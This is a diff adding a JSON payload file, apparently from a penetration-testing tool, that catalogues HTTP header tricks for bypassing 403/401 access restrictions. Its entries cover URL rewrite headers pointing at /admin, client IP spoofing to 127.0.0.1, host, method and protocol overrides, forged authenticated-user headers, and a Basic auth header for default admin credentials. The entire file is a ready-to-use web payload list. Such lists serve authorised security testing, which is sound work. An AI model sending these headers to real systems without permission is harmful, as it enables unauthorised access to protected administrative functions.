@@ -1,0 +1,87 @@
+{
+  "version": "1.0.0",
+  "description": "Header manipulation bypass techniques for 403/401 bypass",
+  "last_updated": "2023-07-20",
+  "techniques": [
+    {
+      "category": "url_override",
+      "description": "Headers that override the requested URL",
+      "payloads": [
+        {"header": "X-Original-URL", "value": "/admin"},
+        {"header": "X-Rewrite-URL", "value": "/admin"},
+        {"header": "X-Originating-URL", "value": "/admin"},
+        {"header": "X-Forwarded-URL", "value": "/admin"},
+        {"header": "X-Remote-URL", "value": "/admin"},
+        {"header": "X-Real-URL", "value": "/admin"},
+        {"header": "X-Proxy-URL", "value": "/admin"},
+        {"header": "Referer", "value": "/admin"},
+        {"header": "Referer", "value": "http://localhost/admin"}
+      ]
+    },
+    {
+      "category": "ip_override",
+      "description": "Headers that override client IP information",
+      "payloads": [
+        {"header": "X-Forwarded-For", "value": "127.0.0.1"},
+        {"header": "X-Real-IP", "value": "127.0.0.1"},
+        {"header": "X-Client-IP", "value": "127.0.0.1"},
+        {"header": "X-Remote-IP", "value": "127.0.0.1"},
+        {"header": "X-Originating-IP", "value": "127.0.0.1"},
+        {"header": "X-Forwarded", "value": "for=127.0.0.1"},
+        {"header": "Forwarded", "value": "for=127.0.0.1"},
+        {"header": "CF-Connecting-IP", "value": "127.0.0.1"},
+        {"header": "True-Client-IP", "value": "127.0.0.1"},
+        {"header": "X-Cluster-Client-IP", "value": "127.0.0.1"}
+      ]
+    },
+    {
+      "category": "host_override",
+      "description": "Headers that override host information",
+      "payloads": [
+        {"header": "X-Forwarded-Host", "value": "localhost"},
+        {"header": "X-Original-Host", "value": "localhost"},
+        {"header": "X-Host", "value": "localhost"},
+        {"header": "Host", "value": "localhost"},
+        {"header": "X-HTTP-Host-Override", "value": "localhost"},
+        {"header": "X-Forwarded-Server", "value": "localhost"}
+      ]
+    },
+    {
+      "category": "method_override",
+      "description": "Headers that override HTTP methods",
+      "payloads": [
+        {"header": "X-HTTP-Method-Override", "value": "GET"},
+        {"header": "X-HTTP-Method", "value": "GET"},
+        {"header": "X-Method-Override", "value": "GET"},
+        {"header": "X-HTTPS-Method-Override", "value": "GET"},
+        {"header": "X-HTTPS-Method", "value": "GET"}
+      ]
+    },
+    {
+      "category": "protocol_override",
+      "description": "Headers that override protocol information",
+      "payloads": [
+        {"header": "X-Forwarded-Proto", "value": "http"},
+        {"header": "X-Forwarded-Protocol", "value": "http"},
+        {"header": "X-Url-Scheme", "value": "http"},
+        {"header": "X-Forwarded-Scheme", "value": "http"},
+        {"header": "X-Forwarded-SSL", "value": "off"},
+        {"header": "Front-End-Https", "value": "off"},
+        {"header": "X-ARR-SSL", "value": ""}
+      ]
+    },
+    {
+      "category": "authentication_bypass",
+      "description": "Headers that bypass authentication",
+      "payloads": [
+        {"header": "X-Original-REMOTE_USER", "value": "admin"},
+        {"header": "X-Remote-User", "value": "admin"},
+        {"header": "X-WEBAUTH-USER", "value": "admin"},
+        {"header": "X-Auth-User", "value": "admin"},
+        {"header": "X-Authenticated-User", "value": "admin"},
+        {"header": "X-Authenticated-Username", "value": "admin"},
+        {"header": "Authorization", "value": "Basic YWRtaW46YWRtaW4="} 
+      ]
+    }
+  ]
+}
